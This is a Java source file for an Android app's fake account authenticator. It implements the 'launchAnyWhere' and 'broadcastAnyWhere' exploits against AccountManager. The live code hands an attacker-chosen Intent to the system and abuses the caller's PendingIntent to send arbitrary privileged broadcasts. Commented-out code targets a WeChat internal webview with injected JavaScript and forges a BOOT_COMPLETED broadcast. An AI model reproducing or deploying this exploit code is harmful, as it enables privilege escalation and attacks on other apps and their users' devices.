package com.boyliang.componentsuperaccessor;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.AccountManager;
import android.accounts.NetworkErrorException;
import android.app.PendingIntent;
import android.app.PendingIntent.CanceledException;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

public final class FakeAccountAuthenticator extends AbstractAccountAuthenticator {
	public final static String HTML = 
			    "<script language=\"javascript\" type=\"text/javascript\">" +
			    "window.location.href=\"http://sina.cn/\"; " +
			    "</script>";
	 
	private Context mContext;
	 
	public FakeAccountAuthenticator(Context context) {
		super(context);
		mContext = context;
	}

	@Override
	public Bundle addAccount(AccountAuthenticatorResponse response, String accountType, String authTokenType, String[] requiredFeatures, Bundle options) throws NetworkErrorException {
		Bundle bundle = new Bundle();
		
		// the exploit of launchAnyWhere
//		Intent intent_for_activity = new Intent();
//		intent_for_activity.setComponent(new ComponentName("com.tencent.mm", "com.tencent.mm.plugin.webview.ui.tools.ContactQZoneWebView"));
//		intent_for_activity.setAction(Intent.ACTION_RUN);
//		intent_for_activity.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//		intent_for_activity.putExtra("data", HTML);
//		intent_for_activity.putExtra("baseurl", "http://sina.cn/");
//		intent_for_activity.putExtra("title", "I am Boy");
//		bundle.putParcelable(AccountManager.KEY_INTENT, intent_for_activity);
//		
//		// the exploit of broadcastAnyWhere
//		final String KEY_CALLER_IDENTITY = "pendingIntent";
//		PendingIntent pendingintent = options.getParcelable(KEY_CALLER_IDENTITY);
//		Intent intent_for_broadcast = new Intent("android.intent.action.BOOT_COMPLETED");
//		intent_for_broadcast.putExtra("info", "I am bad boy");
//		
//		try {
//			pendingintent.send(mContext, 0, intent_for_broadcast);
//		} catch (CanceledException e) {
//			e.printStackTrace();
//		}
		
		final String KEY_CALLER_IDENTITY = "pendingIntent";
		PendingIntent pendingintent = options.getParcelable(KEY_CALLER_IDENTITY);
		if(pendingintent != null){
			handleForBroadcast(pendingintent);
		}
		
		handleForActivity(bundle);
		
		return bundle;
	}
	
	private void handleForActivity(Bundle bundle){
		Intent intent = SuperAccessor.getIntentForActivity();
		if(intent != null){
			bundle.putParcelable(AccountManager.KEY_INTENT, intent);
		}
	}
	
	private void handleForBroadcast(PendingIntent pendingintent){
		Intent intent = SuperAccessor.getIntentForBroadcast();
		if(intent != null){
			try {
				pendingintent.send(mContext, 0, intent);
			} catch (CanceledException e) {
				e.printStackTrace();
			}
		}
	}
	
	@Override
	public Bundle confirmCredentials(AccountAuthenticatorResponse response, Account account, Bundle options) throws NetworkErrorException {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public Bundle getAuthToken(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) throws NetworkErrorException {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public String getAuthTokenLabel(String authTokenType) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public Bundle hasFeatures(AccountAuthenticatorResponse response, Account account, String[] features) throws NetworkErrorException {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public Bundle updateCredentials(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) throws NetworkErrorException {
		// TODO Auto-generated method stub
		return null;
	}

}
